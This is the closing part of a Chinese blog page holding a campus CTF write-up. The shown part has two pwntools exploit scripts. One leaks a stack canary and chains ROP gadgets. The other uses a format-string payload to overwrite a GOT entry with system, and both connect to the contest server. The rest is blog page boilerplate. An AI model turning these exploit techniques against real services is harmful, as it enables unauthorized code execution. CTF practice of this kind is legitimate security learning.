+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># r=process('./canary')</span></span><br><span class="line">r =remote(<span class="string">'202.119.201.197'</span>,<span class="number">10004</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Let's pwn it!"</span>)</span><br><span class="line">r.sendline(<span class="string">b'a'</span>*(<span class="number">56</span>))</span><br><span class="line">r.recvuntil(<span class="string">"a"</span>*<span class="number">56</span>)</span><br><span class="line">canary=u64(r.recv(<span class="number">8</span>))<span class="number">-0xa</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"canary=&gt;"</span> +hex(canary))</span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">56</span>+p64(canary)+<span class="string">b'a'</span>*<span class="number">8</span>+p64(<span class="number">0x00000000004008e3</span>)+p64(<span class="number">0x0000000000400904</span>)+p64(<span class="number">0x4005F0</span>))</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="pwn-4-fmstr"><a href="#pwn-4-fmstr" class="headerlink" title="pwn 4 fmstr"></a>pwn 4 fmstr</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># r=process('./fmstr')</span></span><br><span class="line">r = remote(<span class="string">"202.119.201.197"</span>,<span class="number">10006</span>)</span><br><span class="line">putsgot = <span class="number">0x804a014</span></span><br><span class="line">sysaddr = <span class="number">0x0804857d</span></span><br><span class="line">getsaddr = <span class="number">0x804a014</span></span><br><span class="line">retaddr = <span class="number">0x08048604</span></span><br><span class="line">r.recvuntil(<span class="string">"what's your name:"</span>)</span><br><span class="line">r.sendline(fmtstr_payload(<span class="number">8</span>, &#123;getsaddr: sysaddr&#125;))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-09-29T13:59:58.513Z" itemprop="dateUpdated">2020-09-29 21:59:58</time>
+</span>
+
+
+        
+        原文链接：<a href="/2020/09/25/%E6%A0%A1%E8%B5%9B/" target="_blank" rel="external">https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://github.com/gha01un/gha01un.github.io'">
+            <img src="https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" alt="Mr.Guo">
+            <a>Mr.Guo</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/" rel="tag">RE</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&title=《校赛 WriteUp》 — Mr.Guo&pic=https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&title=《校赛 WriteUp》 — Mr.Guo&source=校赛 WP" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《校赛 WriteUp》 — Mr.Guo&url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&via=https://github.com/gha01un/gha01un.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/10/14/sql%E6%B3%A8%E5%85%A5---sqlmap%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：简单的SQL注入
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/08/20/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20WriteUp/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：第十三届全国大学生信息安全竞赛 WriteUp">下一篇：第十三届全国大学生信息安全竞赛 WriteUp</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+    <!-- Valine Comments -->
+    <div class="comments vcomment" id="comments"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script>
+    <!-- Valine Comments script -->
+    <script>
+        var GUEST_INFO = ['nick','mail','link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+          return GUEST_INFO.indexOf(item) > -1
+        });
+        new Valine({
+            el: '#comments',
+            notify: 'false' == 'true',
+            verify: 'false' == 'true',
+            appId: "3nztltfuvNfYN4yV7zxv4h8U-gzGzoHsz",
+            appKey: "CGxu9DylhaTiqe09F5FkEJzb",
+            avatar: "wavatar",
+            placeholder: "Just go go",
+            guest_info: guest_info.length == 0 ? GUEST_INFO : guest_info,
+            pageSize: "10"
+        })
+    </script>
+    <!-- Valine Comments end -->
+
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2020
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://github.com/gha01un/gha01un.github.io">gha01un.github.io</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+    
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+    
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+    
+        <span class="license">This blog is licensed under a <a rel="license noopener" rel="external nofollow noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+```
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+```
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="https://i.loli.net/2020/06/04/2I7aueljzb9xypn.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="https://i.loli.net/2020/06/04/2I7aueljzb9xypn.jpg" data-alipay="https://i.loli.net/2020/06/04/7lT5ihFeUxEYBLO.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&title=《校赛 WriteUp》 — Mr.Guo&pic=https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&title=《校赛 WriteUp》 — Mr.Guo&source=校赛 WP" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《校赛 WriteUp》 — Mr.Guo&url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/&via=https://github.com/gha01un/gha01un.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+if(window.innerWidth > 600){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+	
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+	
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+	
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+	
+	/* 标题跳动 */
+	$(".archivestitle").bumpyText();
+	
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+	
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+	
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+	
+		document.body.appendChild(myimg);
+	
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+	
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2020/1/22");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Mr.Guo");
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 36.5网友小郭 %c  © Mr. Guo  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<!-- 引入jquery 已经引入过了可去掉 -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript">
+  var windowWidth = $(window).width();
+  if (windowWidth > 480) {
+    document.write('<script type="text/javascript" src="/js/snow.js"><\/script>');
+  }
+</script>
+</body>
+</html>
